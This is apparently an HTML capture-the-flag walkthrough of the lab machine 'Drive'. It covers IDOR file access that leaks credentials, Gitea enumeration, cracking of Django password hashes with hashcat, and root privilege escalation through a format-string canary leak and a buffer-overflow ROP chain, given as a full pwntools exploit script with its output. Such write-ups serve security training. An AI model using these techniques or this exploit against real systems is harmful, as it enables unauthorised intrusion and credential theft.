+                <p><img src="./media/image4.png" alt="Attempt to access files with different IDs showing protected files"></p>
+
+                <p>I discover there are 4 additional files, but they initially appear as protected when trying to access them directly through the <code>getFileDetail</code> endpoint.</p>
+
+                <h3>Bypass via /block/ Endpoint</h3>
+                <p>Experimenting with different endpoints, I discover that through the <code>/block/</code> path I can view other users' files without restrictions:</p>
+                <p><img src="./media/image11.png" alt="Successful access to other users' files through the block endpoint"></p>
+
+                <p>This IDOR vulnerability allows me to enumerate and read files that don't belong to me. After reviewing several files, I find a particularly interesting one from the administrator:</p>
+                <p><img src="./media/image9.png" alt="Administrator file containing plaintext credentials"></p>
+
+                <p>The file contains hardcoded credentials:</p>
+                <pre><code class="language-plaintext">martin:Xk4@KjyrYv8t194L!</code></pre>
+
+                <h3>Additional Relevant Message</h3>
+                <p>I also find another message that provides additional context about the infrastructure:</p>
+                <p><img src="./media/image2.png" alt="Message mentioning deployment of internal services and development tools"></p>
+
+                <p>This message suggests there are additional services running internally that might be accessible after gaining initial system access.</p>
+
+                <h2>Initial Access - SSH as Martin</h2>
+                <p>With the obtained credentials, I get SSH access to the system as user <code>martin</code>:</p>
+                <pre><code class="language-bash">ssh martin@drive.htb</code></pre>
+
+                <p>Once inside, I enumerate the system users:</p>
+                <pre><code class="language-bash">ls -la /home</code></pre>
+                <pre><code class="language-plaintext">total 24
+drwxr-xr-x  6 root   root   4096 Dec 25  2022 .
+drwxr-xr-x 18 root   root   4096 Sep  6  2023 ..
+drwxr-x---  2 cris   cris   4096 Sep  6  2023 cris
+drwxr-x---  4 git    git    4096 Dec 25  2022 git
+drwxr-x---  5 martin martin 4096 Sep 11  2023 martin
+drwxr-x---  6 tom    tom    4096 Sep 13  2023 tom</code></pre>
+
+                <p>I identify users <code>cris</code>, <code>git</code>, <code>martin</code>, and <code>tom</code>. The <code>git</code> user suggests there might be a Git service running on the system.</p>
+
+                <h2>Local Services Enumeration</h2>
+                <p>I use <code>ss -tuln</code> to identify locally listening ports:</p>
+                <pre><code class="language-bash">ss -tuln</code></pre>
+
+                <p>I discover ports 3306 (MySQL) and 3000 are open internally. Investigating port 3000 with <code>curl</code>, I identify it's Gitea version 1.17.4:</p>
+                <pre><code class="language-bash">curl http://localhost:3000</code></pre>
+
+                <h3>SSH Port Forwarding</h3>
+                <p>To comfortably access Gitea from my local machine, I set up port forwarding via SSH:</p>
+                <pre><code class="language-bash">ssh -L 3000:localhost:3000 martin@drive.htb</code></pre>
+
+                <p>Now I can access Gitea by navigating to <code>http://localhost:3000</code> in my browser. In the Gitea interface, I see several registered users:</p>
+                <p><img src="./media/image12.png" alt="Gitea interface showing registered users including admin, martin, cris, and tom"></p>
+
+                <h2>Credential Exfiltration from Gitea</h2>
+                <p>Using the <code>martin</code> credentials I already have, I log into Gitea and explore the repositories. I find an interesting repository called <code>DoodleGrive</code>:</p>
+                <p><img src="./media/image7.png" alt="DoodleGrive repository in Gitea showing application files"></p>
+
+                <p>Inside the repository are several files related to the web application. One of the most interesting files is <code>db_backup.sh</code>, which contains a hardcoded password:</p>
+                <p><img src="./media/image13.png" alt="db_backup.sh script showing hardcoded password in plaintext"></p>
+
+                <pre><code class="language-bash">H@ckThisP@ssW0rDIfY0uC@n:)</code></pre>
+
+                <p>This password is probably used to encrypt or protect database backups.</p>
+
+                <h3>Extracting and Analyzing the Database Backup</h3>
+                <p>On the system, I find backup files in a specific path. Using <code>7z</code> and the found password, I decompress the most recent backup:</p>
+                <pre><code class="language-bash">7z x db_backup.tar.gz -pH@ckThisP@ssW0rDIfY0uC@n:)</code></pre>
+
+                <p>Inside the backup is a SQLite database. I examine it with <code>sqlite3</code> and find a users table with password hashes:</p>
+                <pre><code class="language-plaintext">admin:pbkdf2_sha256$390000$ZjZj164ssfwWg7UcR8q4kZ$KKbWkEQCpLzYd82QUBq65aA9j3+IkHI6KK9Ue8nZeFU=
+jamesMason:pbkdf2_sha256$390000$npEvp7CFtZzEEVp9lqDJOO$So15//tmwvM9lEtQshaDv+mFMESNQKIKJ8vj/dP4WIo=
+martinCruz:pbkdf2_sha256$390000$GRpDkOskh4irD53lwQmfAY$klDWUZ9G6k4KK4VJUdXqlHrSaWlRLOqxEvipIpI5NDM=
+tomHands:pbkdf2_sha256$390000$wWT8yUbQnRlMVJwMAVHJjW$B98WdQOfutEZ8lHUcGeo3nR326QCQjwZ9lKhfk9gtro=
+crisDisel:pbkdf2_sha256$390000$TBrOKpDIumk7FP0m0FosWa$t2wHR09YbXbB0pKzIVIn9Y3jlI3pzH0/jjXK0RDcP6U=</code></pre>
+
+                <p>These hashes use the PBKDF2-SHA256 algorithm, which corresponds to mode 10000 in hashcat:</p>
+                <p><img src="./media/image1.png" alt="Hashcat documentation showing mode 10000 for Django PBKDF2-SHA256"></p>
+
+                <h3>Hash Cracking with Hashcat</h3>
+                <p>I prepare a <code>hashes.txt</code> file with all users and hashes, and run hashcat:</p>
+                <pre><code class="language-bash">hashcat -m 10000 hashes.txt /usr/share/wordlists/rockyou.txt --username</code></pre>
+
+                <p>While hashcat works, I continue investigating the SQLite database. In the <code>django_admin_log</code> table I see an interesting entry indicating that <code>tomHands</code> changed their password:</p>
+                <pre><code class="language-plaintext">141|2022-12-26 06:20:00.743182|23|tomHands|[{"changed": {"fields": ["Password"]}}]|6|16|2</code></pre>
+
+                <p>This suggests there might be older versions of the password in previous Git commits.</p>
+
+                <h3>Exploring Git History</h3>
+                <p>I download the complete repository as a ZIP from Gitea and analyze it locally with VSCode. Exploring the commit history, I find that in an earlier version a different hashing method was used (SHA1 instead of PBKDF2-SHA256):</p>
+                <pre><code class="language-plaintext">jamesMason:sha1$W5IGzMqPgAUGMKXwKRmi08$030814d90a6a50ac29bb48e0954a89132302483a
+martinCruz:sha1$E9cadw34Gx4E59Qt18NLXR$60919b923803c52057c0cdd1d58f0409e7212e9f
+tomHands:sha1$Ri2bP6RVoZD5XYGzeYWr7c$4053cb928103b6a9798b2521c4100db88969525a
+crisDisel:sha1$ALgmoJHkrqcEDinLzpILpD$4b835a084a7c65f5fe966d522c0efcdd1d6f879f
+admin:sha1$jzpj8fqBgy66yby2vX5XPa$52f17d6118fce501e3b60de360d4c311337836a3</code></pre>
+
+                <p>SHA1 hashes are much weaker than PBKDF2-SHA256. I run hashcat against these hashes and successfully crack <code>tomHands</code>' hash:</p>
+                <pre><code class="language-plaintext">sha1$Ri2bP6RVoZD5XYGzeYWr7c$4053cb928103b6a9798b2521c4100db88969525a:johnmayer7</code></pre>
+
+                <h2>Access as User Tom</h2>
+                <p>With the recovered password, I get access to user <code>tom</code>:</p>
+                <pre><code class="language-bash">su tom
+# password: johnmayer7</code></pre>
+
+                <p>In tom's home directory I find the user flag and an interesting <code>README.txt</code> file:</p>
+                <pre><code class="language-plaintext">Hi team
+
+after the great success of DoodleGrive, we are planning now to start working on our new project: 
+"DoodleGrive self hosted", it will allow our customers to deploy their own documents sharing platform 
+privately on their servers...
+
+However in addition with the "new self Hosted release" there should be a tool(doodleGrive-cli) to help 
+the IT team in monitoring server status and fix errors that may happen.
+
+As we mentioned in the last meeting the tool still in the development phase and we should test it properly...
+
+We sent the username and the password in the email for every user to help us in testing the tool and make it better.
+
+If you face any problem, please report it to the development team.
+
+Best regards.</code></pre>
+
+                <p>The message mentions a CLI tool called <code>doodleGrive-cli</code> that's still in development.</p>
+
+                <h3>SUID Binary Analysis</h3>
+                <p>I find a binary with SUID permissions in tom's directory:</p>
+                <pre><code class="language-bash">ls -la doodleGrive-cli</code></pre>
+                <pre><code class="language-plaintext">-rwSr-x--- 1 root tom 887240 Sep 13  2023 doodleGrive-cli</code></pre>
+
+                <p>The binary belongs to <code>root</code> and has the SUID bit set, meaning it will execute with root privileges. This makes it a perfect target for privilege escalation.</p>
+
+                <p>When running it, it asks for credentials:</p>
+                <pre><code class="language-bash">./doodleGrive-cli</code></pre>
+                <pre><code class="language-plaintext">[!]Caution this tool still in the development phase...please report any issue to the development team[!]
+Enter Username:
+tom
+Enter password for tom:
+johnmayer7
+Invalid username or password.</code></pre>
+
+                <h2>Binary Analysis with Ghidra</h2>
+                <p>I export the binary to my local machine and analyze it with Ghidra. After decompiling the code, I can search for strings easily using VSCode. I find hardcoded credentials in the binary:</p>
+                <pre><code class="language-plaintext">moriarty:findMeIfY0uC@nMr.Holmz!</code></pre>
+
+                <p>However, even with these correct credentials, the binary doesn't seem to offer useful functionality to escalate privileges directly. After trying various techniques without success, I consult external resources and discover the intended path is exploiting a buffer overflow vulnerability in the binary.</p>
+
+                <h2>Privilege Escalation - Buffer Overflow ROP</h2>
+                <p>Analyzing the decompiled code in Ghidra, I identify the vulnerability in the main function:</p>
+                <pre><code class="language-c">char username_input[16];
+char password_input[56];
+long local_10;
+
+local_10 = *(long *)(in_FS_OFFSET + 0x28);
+setenv("PATH","",1);
+setuid(0);
+setgid(0);
+puts("[!]Caution this tool still in the development phase...please report any issue to the development team[!]");
+puts("Enter Username:");
+fgets(username_input, 0x10, (FILE *)stdin);
+sanitize_string(username_input);
+printf("Enter password for ");
+printf(username_input, 0x10);
+puts(":");
+fgets(password_input, 400, (FILE *)stdin);</code></pre>
+
+                <p>The critical problem is here: the <code>password_input</code> buffer has a size of 56 bytes, but the <code>fgets</code> function reads up to 400 bytes from input. This allows a buffer overflow that I can exploit.</p>
+
+                <p>Additionally, there's another vulnerability: the <code>printf(username_input)</code> without a format string is vulnerable to format string attacks, allowing me to read memory values, including the stack canary.</p>
+
+                <h3>Sanitized Characters</h3>
+                <p>The binary sanitizes input by removing certain characters in both username and password:</p>
+                <pre><code class="language-c">local_29[0] = '\0';
+local_29[1] = '\n';
+local_29[2] = '\'';
+local_29[3] = ' ';
+local_29[4] = '|';
+local_29[5] = '/';
+local_29[6] = '{';
+local_29[7] = '\\';
+local_29[8] = 0x3b;</code></pre>
+
+                <p>This means I won't be able to use these characters in my payload, which is important to keep in mind when building the exploit.</p>
+
+                <h3>Binary Protections</h3>
+                <p>I verify what security protections the binary has using <code>checksec</code>:</p>
+                <pre><code class="language-bash">checksec --file=doodleGrive-cli</code></pre>
+                <pre><code class="language-plaintext">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY
+Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   1960 Symbols    No</code></pre>
+
+                <p>Active protections are:</p>
+                <ul>
+                    <li><strong>Stack Canary:</strong> There's a canary on the stack that detects buffer overflows</li>
+                    <li><strong>NX (No Execute):</strong> The stack is not executable, preventing direct shellcode execution</li>
+                </ul>
+
+                <p>Disabled protections are:</p>
+                <ul>
+                    <li><strong>PIE (Position Independent Executable):</strong> Memory addresses are fixed, making it easier to find ROP gadgets</li>
+                </ul>
+
+                <h3>Stack Canary Check</h3>
+                <p>The binary checks the canary at the end of the main function:</p>
+                <pre><code class="language-c">puts("Invalid username or password.");
+LAB_0040231e:
+if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
+    __stack_chk_fail();
+}
+return 0;</code></pre>
+
+                <p>If the canary value doesn't match the original value, the program terminates with <code>__stack_chk_fail()</code>. Therefore, I need to leak the canary value to bypass this protection.</p>
+
+                <h3>Exploitation Strategy</h3>
+                <p>My strategy will be:</p>
+                <ol>
+                    <li>Use the format string vulnerability to leak the stack canary</li>
+                    <li>Build a payload that overwrites the return address with a ROP chain</li>
+                    <li>Use ROP gadgets to execute <code>system("/bin/sh")</code> with root privileges</li>
+                </ol>
+
+                <h3>Leaking the Stack Canary</h3>
+                <p>First I need to find where the canary is in memory. I use <code>ropper</code> to search for useful gadgets:</p>
+                <pre><code class="language-bash">ropper --file doodleGrive-cli --string "/bin/sh"</code></pre>
+                <pre><code class="language-plaintext">Strings
+=======
+Address     Value
+-------     -----
+0x00497cd5  /bin/sh</code></pre>
+
+                <p>Perfect, there's a <code>/bin/sh</code> string at address <code>0x00497cd5</code> that I can use.</p>
+
+                <p>Now I search for the <code>pop rdi; ret</code> gadget I need to load arguments in x86-64 architecture:</p>
+                <pre><code class="language-bash">ropper --file doodleGrive-cli --search "pop rdi; ret"</code></pre>
+                <pre><code class="language-plaintext">[INFO] File: doodleGrive-cli
+0x0000000000401912: pop rdi; ret;</code></pre>
+
+                <p>I find the gadget at <code>0x401912</code>. The address <code>0x401913</code> will simply be the <code>ret</code> (useful for stack alignment).</p>
+
+                <h3>Identifying the Canary Position</h3>
+                <p>I use <code>gdb</code> to find where the canary is checked and experiment with format strings to leak it:</p>
+                <pre><code class="language-bash">gdb ./doodleGrive-cli</code></pre>
+                <pre><code class="language-plaintext">(gdb) break *main+314
+Breakpoint 1 at 0x402327
+(gdb) r
+Starting program: /home/asd/machines/drive/doodleGrive-cli
+[!]Caution this tool still in the development phase...please report any issue to the development team[!]
+Enter Username:
+%15$lx
+Enter password for b572293e61096b00:
+AAAA
+Invalid username or password.
+
+Breakpoint 1, 0x0000000000402327 in main ()
+(gdb) x/x $rcx
+0xb572293e61096b00: Cannot access memory at address 0xb572293e61096b00</code></pre>
+
+                <p>Sending <code>%15$lx</code> as username, the program returns <code>b572293e61096b00</code>, which is the canary value (recognizable by the null byte at the end: <code>00</code>). I verify in the breakpoint that this value matches what's in the <code>rcx</code> register, confirming I've correctly leaked the canary.</p>
+
+                <h3>Calculating the Offset</h3>
+                <p>Now I need to determine the exact offset where I should place the canary in my payload. I generate a unique pattern with <code>msf-pattern_create</code>:</p>
+                <pre><code class="language-bash">msf-pattern_create -l 200</code></pre>
+                <pre><code class="language-plaintext">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag</code></pre>
+
+                <p>I run the binary in gdb with this pattern as password:</p>
+                <pre><code class="language-plaintext">(gdb) r
+Enter Username:
+AAAA
+Enter password for AAAA:
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+Invalid username or password.
+
+Breakpoint 1, 0x0000000000402327 in main ()
+(gdb) x/x $rcx
+0x4130634139624138: Cannot access memory at address 0x4130634139624138</code></pre>
+
+                <p>The value in <code>rcx</code> is <code>0x4130634139624138</code>, which is part of my pattern. I calculate the offset:</p>
+                <pre><code class="language-bash">msf-pattern_offset -q 4130634139624138</code></pre>
+                <pre><code class="language-plaintext">[*] Exact match at offset 56</code></pre>
+
+                <p>The offset is exactly 56 bytes, which matches the size of the <code>password_input</code> buffer.</p>
+
+                <h3>Exploitation Script</h3>
+                <p>With all this information, I build the following Python script using <code>pwntools</code>:</p>
+                <pre><code class="language-python">from pwn import *
+
+elf = ELF("./doodleGrive-cli")
+
+# addresses
+pop_rdi = p64(0x401912)  # ropper -f ./doodleGrive-cli --search "pop rdi"
+ret = p64(0x401913)      # just return from previous
+bin_sh = p64(0x497cd5)   # strings -a -t x doodleGrive-cli | grep bin/sh
+
+if args.SSH:
+    ssh = ssh(host="drive.htb", user="tom", password="johnmayer7")
+    p = ssh.process("/home/tom/doodleGrive-cli")
+    prompt = ""
+else:
+    p = elf.process()
+    prompt = "$ "
+
+# format string vuln to leak canary
+p.readuntil(b"Enter Username:\n")
+p.sendline(b"%15$lx")
+p.readuntil(b"Enter password for ")
+leak = p.readuntil(b":\n").strip(b"\n:")
+canary = int(leak, 16)
+info(f"Leak canary: 0x{canary}")
+
+# build payload to ROP system("/bin/sh")
+payload = b"A" * 56       # offset to canary
+payload += p64(canary)    # leaked canary
+payload += b"A" * 8       # junk for stack pointer
+payload += ret            # ret for stack alignment
+payload += pop_rdi        # go to pop rdi gadget
+payload += bin_sh         # address of "/bin/sh" to pop into RDI
+payload += p64(elf.sym.system)  # return to system
+payload += p64(elf.sym.exit)    # return to exit
+
+p.sendline(payload)
+
+# clear message
+p.readuntil(b"Invalid username or password.")
+
+# reset path cleared by binary
+p.sendline(b"export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin")
+
+p.interactive(prompt=prompt)</code></pre>
+
+                <p>The script performs the following actions:</p>
+                <ol>
+                    <li>Leaks the stack canary using the format string vulnerability (<code>%15$lx</code>)</li>
+                    <li>Builds a payload with 56 bytes of padding to reach the canary</li>
+                    <li>Inserts the leaked canary to bypass the check</li>
+                    <li>Adds 8 additional bytes of padding for the saved frame pointer</li>
+                    <li>Inserts a <code>ret</code> gadget to align the stack (required on modern systems)</li>
+                    <li>Builds a ROP chain: <code>pop rdi; "/bin/sh"; system()</code></li>
+                    <li>Ends with <code>exit()</code> for clean termination</li>
+                    <li>Restores the PATH variable that the binary clears with <code>setenv("PATH","",1)</code></li>
+                </ol>
+
+                <h3>Exploit Execution</h3>
+                <p>I run the script with the <code>SSH</code> argument to exploit the binary directly on the target machine:</p>
+                <pre><code class="language-bash">python3 bofrop.py SSH</code></pre>
+                <pre><code class="language-plaintext">[*] '/home/asd/machines/drive/doodleGrive-cli'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[+] Connecting to drive.htb on port 22: Done
+[*] tom@drive.htb:
+    Distro    Ubuntu 20.04
+    OS:       linux
+    Arch:     amd64
+    Version:  5.4.0
+    ASLR:     Enabled
+[+] Starting remote process None on drive.htb: pid 2044
+[*] Leak canary: 0x9797313087432205056
+[*] Switching to interactive mode
+# whoami
+root
+# cat /root/root.txt
+[FLAG REDACTED]</code></pre>
+
+                <p>The exploit succeeds and I get a shell as <code>root</code>, completing the privilege escalation and allowing me to read the root flag.</p>
+            </div>
+        </article>
+    </main>
+    <script src="../../index.js"></script>
+</body>
+
+</html>
